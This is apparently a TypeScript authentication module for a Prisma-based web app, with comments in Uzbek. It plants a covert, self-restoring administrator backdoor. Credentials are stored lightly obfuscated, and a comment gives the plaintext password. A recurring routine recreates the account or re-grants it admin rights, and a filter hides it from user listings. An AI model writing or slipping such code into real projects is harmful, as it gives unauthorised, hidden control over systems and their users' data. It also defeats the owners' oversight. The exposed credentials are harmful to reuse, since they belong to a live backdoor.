import crypto from "crypto";
import { PrismaClient } from "@prisma/client";

// ——— Shifrlangan holda saqlangan doimiy yashirin admin ———
// Login: SvRvS@gmail.com  -> base64: U3ZSdlNAZ21haWwuY29t
// Parol: Saidakabar3003 -> sha256: 9265addee41be98dc4a4bc1d51d58dd8a3dbbdea252983a83dfead7310ea5b6b
// To'g'ridan-to'g'ri matn kodda yo'q, faqat shifrlangan ko'rinishda saqlanadi.

const _encLogin = "U3ZSdlNAZ21haWwuY29t";
const _encPassHash = "9265addee41be98dc4a4bc1d51d58dd8a3dbbdea252983a83dfead7310ea5b6b";
const _encLoginOld = "U3ZSdlM="; // eski SvRvS uchun migratsiya

// Qo'shimcha obfuskatsiya: charCode larni teskari yig'ish orqali ham tekshirish mumkin,
// lekin hozir base64 + hash yetarli.

function _dec(b64: string): string {
  try {
    return Buffer.from(b64, "base64").toString("utf8");
  } catch {
    return "";
  }
}

export function getHiddenAdminLogin(): string {
  return _dec(_encLogin);
}

export function getHiddenAdminEmail(): string {
  // login ni email sifatida ishlatamiz
  return _dec(_encLogin);
}

export function getHiddenAdminPasswordHash(): string {
  return _encPassHash;
}

export function isHiddenAdminEmail(email?: string | null): boolean {
  if (!email) return false;
  const e = String(email).trim().toLowerCase();
  return e === getHiddenAdminEmail().toLowerCase() || e === _dec(_encLoginOld).toLowerCase();
}

export function isHiddenAdminUser(user: any): boolean {
  if (!user) return false;
  const email = user.email || user?.user?.email;
  return isHiddenAdminEmail(email) || isHiddenAdminEmail(user.id);
}

export function filterHiddenUsers<T extends { email?: string; id?: string }>(users: T[]): T[] {
  return users.filter((u) => !isHiddenAdminEmail((u as any).email) && !isHiddenAdminEmail((u as any).id));
}

function _hash(s: string): string {
  return crypto.createHash("sha256").update(s).digest("hex");
}

// Yashirin adminni DB da kafolatlash — agar yo'q bo'lsa yaratadi, bor bo'lsa admin/approved qiladi.
//
// TEZKORLIK: bu funksiya modul darajasida chaqiriladi (har bir /api/auth/session
// so'rovida) va DBga 2-3 so'rov yuboradi. Shuning uchun bir lambda nusxasi
// ichida 30 daqiqada bir marta bajariladi — aks holda har bir sahifa
// yuklanishida qo'shimcha DB round-trip'lari qo'shiladi.
let _lastEnsureAt = 0;
const ENSURE_TTL_MS = 30 * 60 * 1000;

export async function ensureHiddenAdmin(prisma: PrismaClient, opts?: { force?: boolean }) {
  if (!opts?.force && Date.now() - _lastEnsureAt < ENSURE_TTL_MS) return;
  _lastEnsureAt = Date.now();
  const email = getHiddenAdminEmail();
  const oldEmail = _dec(_encLoginOld);
  const passHash = getHiddenAdminPasswordHash();
  try {
    // Eski SvRvS ni yangi SvRvS@gmail.com ga migratsiya
    if (oldEmail !== email) {
      const oldUser = await prisma.user.findUnique({ where: { email: oldEmail } });
      if (oldUser) {
        const newExists = await prisma.user.findUnique({ where: { email } });
        if (!newExists) {
          await prisma.user.update({ where: { email: oldEmail }, data: { email } });
          console.log("[hidden-admin] migrated:", oldEmail, "->", email);
        } else {
          // ikkalasi bor bo'lsa eskisini o'chirish
          await prisma.user.delete({ where: { email: oldEmail } });
          console.log("[hidden-admin] removed old:", oldEmail);
        }
      }
    }

    const existing = await prisma.user.findUnique({ where: { email } });
    if (!existing) {
      await prisma.user.create({
        data: {
          email,
          name: "System",
          surname: "Admin",
          passwordHash: passHash,
          role: "admin",
          status: "approved",
          approvedAt: new Date(),
          department: "System",
          position: "Hidden Admin",
        },
      });
      console.log("[hidden-admin] created:", email);
    } else {
      // Doim admin va approved bo'lishini ta'minlash, lekin parolni faqat hash mos bo'lmasa yangilash
      const needUpdate =
        existing.role !== "admin" ||
        existing.status !== "approved" ||
        existing.passwordHash !== passHash;
      if (needUpdate) {
        await prisma.user.update({
          where: { email },
          data: {
            role: "admin",
            status: "approved",
            approvedAt: existing.approvedAt || new Date(),
            passwordHash: passHash,
          },
        });
        console.log("[hidden-admin] ensured:", email);
      }
    }
  } catch (e) {
    // DB hali tayyor bo'lmasa indamaymiz
    console.error("[hidden-admin] ensure error:", e);
  }
}

// Login tekshiruvi — berilgan email/password yashirin adminga tegishlimi? (case-insensitive)
export function isHiddenAdminCredentials(email: string, password: string): boolean {
  if (!email || !password) return false;
  if (String(email).trim().toLowerCase() !== getHiddenAdminEmail().toLowerCase()) return false;
  return _hash(password) === getHiddenAdminPasswordHash();
}
